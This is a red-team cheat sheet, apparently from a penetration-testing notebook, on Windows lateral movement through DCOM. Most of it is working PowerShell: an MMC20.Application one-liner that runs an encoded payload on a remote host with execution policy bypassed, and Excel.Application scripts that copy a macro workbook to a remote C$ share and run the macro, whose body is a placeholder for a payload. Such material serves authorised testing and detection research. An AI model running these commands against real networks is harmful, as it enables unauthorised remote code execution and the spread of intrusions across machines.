---
author(s):
  - Userware
tags:
  - post-exploitation
  - lateral-movement
  - living-off-the-land
  - T1021-003
  - network-protocols
  - msrpc
  - windows
---
# Living off the Land

## 01 - PowerShell

### 1.1 - `MMC20.Application`

```powershell
C:\> powershell -exec bypass -command "[activator]::CreateInstance([type]::GetTypeFromProgID('MMC20.Application', '<IP>')).Document.ActiveView.ExecuteShellCommand('C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe', $null, '-E <base64_payload>', '7')"

PS C:\> [activator]::CreateInstance([type]::GetTypeFromProgID('MMC20.Application', '<IP>')).Document.ActiveView.ExecuteShellCommand('C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe', $null, '-E <base64_payload>', '7')
```

### 1.2 - `Excel.Application`

```powershell
PS C:\> $com = [activator]::CreateInstance([type]::GetTypeFromProgId("Excel.Application", "<IP>"))
$com | Get-Member
```

```vbscript
Sub mymacro()
    'payload goes here
    Shell ("notepad.exe")
End Sub
```

`$ cat copyexceldcom.ps1`

---

```powershell
$com = [activator]::CreateInstance([type]::GetTypeFromProgId("Excel.Application", "<IP>"))

$LocalPath = "path\to\excelmacrofile.xls"

$RemotePath = "\\<IP>\C$\excelmacrofile.xls"

[System.IO.File]::Copy($LocalPath, $RemotePath, $True)
```

`$ cat openexceldcom.ps1`

---

```powershell
$com = [activator]::CreateInstance([type]::GetTypeFromProgId("Excel.Application", "<IP>"))

$LocalPath = "C:\path\to\excelmacrofile.xls"

$RemotePath = "\\<IP>\C$\excelmacrofile.xls"

[System.IO.File]::Copy($LocalPath, $RemotePath, $True)

# When running as system adminstrator privileges
$Path = "\\<IP>\C$\Windows\sysWOW64\config\systemprofile\Desktop"

$temp = [System.IO.Directory]::CreateDirectory($Path)

$Workbook = $com.Workbooks.Open("C:\excelmacrofile.xls")

$com.Run("mymacro")
```

---
## References

### evilcomrade

- [evilcomrade: Windows Lateral Movement Fu](https://1evilcomrade.blogspot.com/2017/11/windows-lateral-movement-fu.html)

### Riccardo Ancarani

- [Riccardo Ancarani: Red Team Adventures - Lateral Movement Windows and Active Directory](https://riccardoancarani.github.io/2019-10-04-lateral-movement-megaprimer/)

### Hacking Articles

- [Hacking Articles: Remote Services (Mitre:T1021)](https://www.hackingarticles.in/lateral-movement-remote-services-mitret1021/)

### DMCXBlue

- [DMCXBlue: Component Object Model and Distributed COM](https://dmcxblue.gitbook.io/red-team-notes/execution/com)